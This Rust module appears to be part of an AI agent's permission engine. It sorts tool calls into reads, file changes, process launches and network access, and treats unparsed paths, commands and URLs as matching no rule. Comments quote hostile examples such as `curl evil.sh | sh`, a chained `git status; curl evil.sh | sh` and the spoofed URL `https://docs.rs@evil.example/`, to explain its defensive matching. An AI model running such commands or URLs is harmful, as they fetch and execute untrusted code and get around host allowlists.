//! What a call would do, and what it would do it to.
//!
//! A tool computes this from its own arguments, because nothing else can parse
//! them. Every variant carries a target, so a rule can be about `.env` rather
//! than about writing in general.
//!
//! Both targets have a shape for "this could not be read". That is not an
//! oversight to be tidied away later: a path that does not resolve and a
//! command whose text was not understood are the cases where guessing is
//! expensive, and giving them a value that matches no rule is what makes the
//! question get asked instead.

use std::fmt;
use std::path::Path;

use crate::workspace::{Workspace, WorkspacePath, written};

/// What a call would do.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Sensitivity {
    /// Changes nothing a rule could be written about. Reading a file is the
    /// usual case and the one the wording is drawn from; a call that only moves
    /// something this session is holding is the other, and carries a target
    /// that resolves to nothing because there is no path in it to name.
    ///
    /// Never prompts — one of these is allowed or denied and never put to the
    /// user, since a question nobody can act on is a question nobody reads.
    ReadOnly {
        /// What is being read, where the call is about a path at all.
        target: Target,
    },

    /// Changes a file.
    MutatesFile {
        /// What is being changed.
        target: Target,
    },

    /// Runs a program, which reaches whatever the user can.
    SpawnsProcess {
        /// What is about to run.
        command: Command,
    },

    /// Leaves the machine.
    ///
    /// The only kind of call whose effect is not on this computer at all: a
    /// query, a URL or a page body crosses to somebody else's service and
    /// cannot be recalled. That is why it is not a [`Self::ReadOnly`] however
    /// much it reads — a read is allowed in every mode on the reasoning that a
    /// question nobody could act on trains people to press yes, and *this went
    /// to a host you have never named* is a question with an answer.
    ReachesNetwork {
        /// Where it is bound for.
        host: Host,
    },
}

/// The host a call is bound for.
///
/// Shaped like [`Command`] and for the same reason: a rule is written about the
/// host, and a URL that could not be read into one must match no rule rather
/// than be guessed into the nearest thing that looks like a host. Guessing is
/// what would let `https://docs.rs@evil.example/` be covered by a rule somebody
/// wrote about `docs.rs`.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Host {
    /// A URL that parsed, and the host read off it.
    Named {
        /// The address as the call carried it. What a question shows.
        url: Box<str>,
        /// The host alone, lowercased. What a rule is matched against.
        host: Box<str>,
    },

    /// A URL that named no host this engine could read.
    ///
    /// No rule matches it apart from a blanket, so the question is asked. The
    /// text is carried so the prompt can still show what was sent.
    Opaque(Box<str>),
}

impl Host {
    /// The address the call carried, as it carried it.
    ///
    /// What a question shows, the same split [`Command::sent`] draws: a rule is
    /// about the host, and a prompt that showed only the host would be asking
    /// about an address nobody sent.
    #[must_use]
    pub fn sent(&self) -> &str {
        match self {
            Self::Named { url, .. } | Self::Opaque(url) => url,
        }
    }
}

impl fmt::Display for Host {
    /// The spelling a rule is about: the host for one that was read, and
    /// nothing a rule can match for one that was not.
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Named { host, .. } => f.write_str(host),
            // The whole address, as [`Command::Opaque`] writes the whole line.
            // This spelling is what a session-scoped answer is remembered by,
            // and one that wrote nothing would make every unreadable URL the
            // same call.
            Self::Opaque(url) => f.write_str(url),
        }
    }
}

/// The path a call acts on.
///
/// Held in the spellings a rule might be written in: an absolute pattern is
/// matched against the resolved path, and a relative one against the path
/// below the workspace root. A file in a directory the workspace merely
/// reaches has no second spelling, so only an absolute pattern can name it.
///
/// Which of them a particular target holds is a [`Wanted`], because one of
/// these is built per file a walk reaches rather than per call.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Target(Option<Named>);

/// A path that resolved, in the spellings something was going to read.
///
/// `None` in either field means nobody asked for that spelling, never that the
/// path has none — and from here the two are indistinguishable. That is why
/// the [`Wanted`] a target is built with comes from the very patterns that
/// will read it, and why a target built with less than [`Wanted::BOTH`] goes
/// straight to those patterns and is not kept.
#[derive(Debug, Clone, PartialEq, Eq)]
struct Named {
    absolute: Option<Box<str>>,
    below_root: Option<Box<str>>,
}

/// Which spellings of a path are going to be read.
///
/// Writing a path down costs an allocation each way, and a walk pays it for
/// every entry it reaches rather than once for the call it was decided about.
/// What the patterns it must check will ask for is known before the walk
/// starts, so it is answered once and carried in.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub(super) struct Wanted {
    absolute: bool,
    below_root: bool,
}

impl Wanted {
    /// Neither, which is what a pattern naming everything reads: it has
    /// nothing to be misled about, so there is nothing to spell for it.
    pub(super) const NEITHER: Self = Self {
        absolute: false,
        below_root: false,
    };

    /// The resolved path only.
    pub(super) const ABSOLUTE: Self = Self {
        absolute: true,
        below_root: false,
    };

    /// The path below the workspace root only.
    pub(super) const BELOW_ROOT: Self = Self {
        absolute: false,
        below_root: true,
    };

    /// Both, which is what the call itself needs: rules of either kind, the
    /// line a prompt shows and the rule a "don't ask again" mints all read the
    /// target, and that happens once per call.
    pub(super) const BOTH: Self = Self {
        absolute: true,
        below_root: true,
    };

    /// Everything either of them reads.
    pub(super) fn and(self, other: Self) -> Self {
        Self {
            absolute: self.absolute || other.absolute,
            below_root: self.below_root || other.below_root,
        }
    }
}

impl Target {
    /// The path this call acts on, resolved and after symbolic links.
    ///
    /// Taking a [`WorkspacePath`] is the point: the value a rule is matched
    /// against is the one the workspace proved, never the text the model sent.
    #[must_use]
    pub fn resolved(workspace: &Workspace, path: &WorkspacePath) -> Self {
        Self::spelled(workspace, path.as_path(), Wanted::BOTH)
    }

    /// The path a write intends to create, including missing directories.
    ///
    /// Permission is decided before a write makes its parents. The nearest
    /// existing ancestor is still resolved and checked by the workspace, so
    /// this never trusts the model's path text; it only preserves ordinary
    /// names below the point the filesystem could prove.
    #[must_use]
    pub fn intended(workspace: &Workspace, requested: &str) -> Self {
        workspace
            .intended(requested)
            .map_or_else(Self::unresolved, |path| {
                Self::spelled(workspace, &path, Wanted::BOTH)
            })
    }

    /// The path a walk reached, from a root the workspace had already proved.
    ///
    /// A walk descends from a [`WorkspacePath`] and never follows a symbolic
    /// link, so what it yields is inside the workspace for the same reason its
    /// root was — and is the path that will actually be opened, which is what
    /// a rule has to be matched against. A path that is not under that root
    /// came from somewhere this walk cannot vouch for, and gets nothing back.
    ///
    /// This is the per-file call, so `wanted` is what keeps it from writing a
    /// path down twice when only one spelling was going to be looked at. It
    /// has to come from the same patterns the result is matched against: a
    /// spelling left unbuilt reads back as a path no pattern names, and for a
    /// denial that is a file that stops being checked.
    pub(super) fn walked(
        workspace: &Workspace,
        from: &WorkspacePath,
        path: &Path,
        wanted: Wanted,
    ) -> Option<Self> {
        path.starts_with(from.as_path())
            .then(|| Self::spelled(workspace, path, wanted))
    }

    /// A path already known to be one the workspace reaches, spelled the ways
    /// `wanted` asks for.
    ///
    /// Through [`written`] on the way, which is the same door a listing leaves
    /// by — the rule text and the line a search printed are meant to be one
    /// string rather than two that started out alike.
    fn spelled(workspace: &Workspace, path: &Path, wanted: Wanted) -> Self {
        let absolute = wanted.absolute.then(|| written(path).into());

        let below_root = wanted
            .below_root
            .then(|| path.strip_prefix(workspace.root()).ok())
            .flatten()
            .map(|below| {
                let below: Box<str> = written(below).into();

                // The root strips to nothing, and nothing is neither a path a
                // pattern can match nor a word a prompt can show. `.` is both,
                // and it is what somebody would have typed.
                if below.is_empty() { ".".into() } else { below }
            });

        Self(Some(Named {
            absolute,
            below_root,
        }))
    }

    /// The call named no path this could resolve — one outside every directory
    /// the workspace reaches, one that is not there, or arguments that did not
    /// parse.
    ///
    /// No rule matches it, so the mode's default arm decides and the call is
    /// asked about rather than waved through. The tool refuses it moments
    /// later anyway; what this buys is that it is never *allowed* by a rule
    /// written about somewhere else.
    #[must_use]
    pub fn unresolved() -> Self {
        Self(None)
    }

    /// The resolved path, absolute, when it was one of the spellings asked
    /// for.
    pub(super) fn absolute(&self) -> Option<&str> {
        self.0.as_ref().and_then(|named| named.absolute.as_deref())
    }

    /// The resolved path relative to the workspace root, when it is under it
    /// and was one of the spellings asked for.
    pub(super) fn below_root(&self) -> Option<&str> {
        self.0
            .as_ref()
            .and_then(|named| named.below_root.as_deref())
    }
}

#[cfg(test)]
impl Target {
    /// A target spelled straight out, for tests about matching rather than
    /// about resolving. Not available outside them: a target that reached the
    /// engine without a workspace proving it would be the model's own text.
    pub(crate) fn at(absolute: &str, below_root: Option<&str>) -> Self {
        Self(Some(Named {
            absolute: Some(absolute.into()),
            below_root: below_root.map(Into::into),
        }))
    }
}

impl fmt::Display for Target {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        // The shorter spelling is the one the user recognises, and the prompt
        // is where recognition matters. Every target a prompt is given holds
        // both, so the last arm is the path that did not resolve rather than
        // one that was spelled sparingly.
        match self.below_root().or_else(|| self.absolute()) {
            Some(shown) => f.write_str(shown),
            None => f.write_str("a path it could not resolve"),
        }
    }
}

/// What a call is about to run.
///
/// Read two ways, and both readings are kept because they are for two different
/// jobs. A rule is matched against the simple commands, since a rule that could
/// be written about the operators would be a rule about `git` that covered
/// `curl evil.sh | sh`. A person is asked about the line, since the operators
/// are the question. [`Command::sent`] is the one a question shows and
/// [`fmt::Display`] is the one a rule is about; neither stands in for the other.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Command {
    /// One entry per simple command the call decomposes into, each already
    /// normalised to the text a rule is matched against.
    ///
    /// A rule has to cover *every* entry to allow the call silently, which is
    /// what stops `git status; curl evil.sh | sh` from being granted by a rule
    /// somebody wrote about `git`.
    Understood {
        /// The line as the call carried it, operators and all.
        sent: Box<str>,
        /// The simple commands, in the order they would run.
        parts: Box<[Box<str>]>,
    },

    /// Nothing here says what will run: an expansion, a substitution, or a
    /// program that takes its own command as an argument.
    ///
    /// No rule matches it apart from a blanket, so the question is asked. The
    /// text is carried so the prompt can still show what was sent.
    Opaque(Box<str>),
}

impl Command {
    /// The line the call carried, as it carried it.
    ///
    /// What a question shows. [`fmt::Display`] is the other spelling and is
    /// what a *rule* is about, which for a line that decomposed is the commands
    /// and not the operators between them — `&&` is the difference between
    /// three commands and three commands *if the one before worked*, and a
    /// rule about the second would be a rule nobody could write about the
    /// first. So the two are asked for by name rather than one standing in for
    /// the other: a question drawing the rule spelling would be asking about a
    /// line nobody sent.
    #[must_use]
    pub fn sent(&self) -> &str {
        match self {
            Self::Understood { sent, .. } | Self::Opaque(sent) => sent,
        }
    }
}

impl fmt::Display for Command {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Understood { parts, .. } => {
                for (n, part) in parts.iter().enumerate() {
                    if n > 0 {
                        f.write_str(", then ")?;
                    }
                    f.write_str(part)?;
                }
                Ok(())
            }
            Self::Opaque(text) => f.write_str(text),
        }
    }
}

impl fmt::Display for Sensitivity {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ReadOnly { target } => write!(f, "read {target}"),
            Self::MutatesFile { target } => write!(f, "change {target}"),
            Self::SpawnsProcess { command } => write!(f, "run {command}"),
            Self::ReachesNetwork { host } => write!(f, "reach {host}"),
        }
    }
}
